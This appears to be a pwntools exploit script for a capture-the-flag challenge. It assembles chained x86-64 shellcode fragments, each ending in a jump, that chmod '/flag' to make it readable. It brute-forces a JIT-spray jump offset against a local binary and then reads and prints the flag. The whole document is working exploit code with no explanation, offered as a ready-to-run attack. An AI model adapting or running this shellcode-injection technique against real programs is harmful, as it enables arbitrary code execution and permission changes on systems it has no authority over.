#!/usr/bin/python3
from pwn import *
from sys import exit

context.binary = binary = ELF("", checksec=False)
context.log_level = "critical"
bp = ""
pack = make_packer("all")

_g = '''
set disassembly-flavor intel 
break *main+0x237
break *main+0x274
display/8i $rip
display/x $rax
display/x $rdi
display/x $rsi
display/x $r9
display/x $r8
c
'''

def _compile(v, vv):
    # mov ebx, 0x67617c66
    def stage1():
        shellcode = "909090909090eb09"
        shellcode += "01" + ("00" * 7) + "40" + ("00" * 7)
        return shellcode
    
    def stage2():
        shellcode = "bb666c616790eb09"
        shellcode += "01" + ("00" * 7) + "40" + ("00" * 7)
        return shellcode
    
    # shl rbx, 0x8
    # mov bl, 0x2f
    def stage3():
        shellcode = "48c1e308b32feb09"
        shellcode += "01" + ("00" * 7) + "40" + ("00" * 7)
        return shellcode
    
    # push rbx
    # mov rdi, rsp
    # xor eax, eax
    def stage4():
        shellcode = "534889e731c0eb09"
        shellcode += "01" + ("00" * 7) + "40" + ("00" * 7)
        return shellcode
    
    # xor esi, esi
    # mov al, 0x5a
    def stage5():
        shellcode = "31f6b05a9090eb09"
        shellcode += "01" + ("00" * 7) + "40" + ("00" * 7)
        return shellcode
    
    # mov sil, 0x04
    # syscall
    def stage6():
        shellcode = "40b6040f05eb0990"
        shellcode += "01" + ("00" * 7) + "40" + ("00" * 7)
        return shellcode
    
    def stage7():
        shellcode = "b03c0f0590909090"
        shellcode += "01" + ("00" * 7) + "40" + ("00" * 7)
        return shellcode

    def read_jit():
        shellcode = "4831c04831ff0f05"
        shellcode += "01"
        shellcode += "00" * 7
        shellcode += "40"
        shellcode += "00" * 7
        return shellcode

    # jmp value 0x2000 + ??
    def spray(v, vv):
        shellcode = f"{vv}{v}"
        print(f"{vv}{v}")
        shellcode += "00" * 6
        shellcode += "20"
        shellcode += "00" * 7
        shellcode += "40"
        shellcode += "00" * 7
        return shellcode
    
    # jmp (dont edit)
    def jmp():
        shellcode = "20"
        shellcode += "00" * 7
        shellcode += "00" * 8
        shellcode += "80"
        shellcode += "00" * 7
        return shellcode
    
    shellcode = read_jit()
    shellcode += stage1()
    shellcode += stage2()
    shellcode += stage3()
    shellcode += stage4()
    shellcode += stage5()
    shellcode += stage6()
    shellcode += stage7()
    shellcode += spray(v, vv)
    shellcode += jmp()
    
    return bytes.fromhex(shellcode)

if __name__ == "__main__":
    for v in range(0, 100):
        for vv in range(0, 100):
            shellcode = _compile(str(v).zfill(2), str(vv).zfill(2))
            p = process()
            #p = gdb.debug(bp, gdbscript=_g, terminal=["tmux", "splitw", "-h"])
            p.recv()
            p.sendline(shellcode)
            p.recvuntil(b'ret')
            p.recvuntil(b'ret')
            p.recv()
            p.close()
            p.kill()

            try:
                with open("/flag", "r") as f:
                    print(f"W at {v}{vv}")
                    print(f.read())
                    f.close()
                    break
            except:
                continue
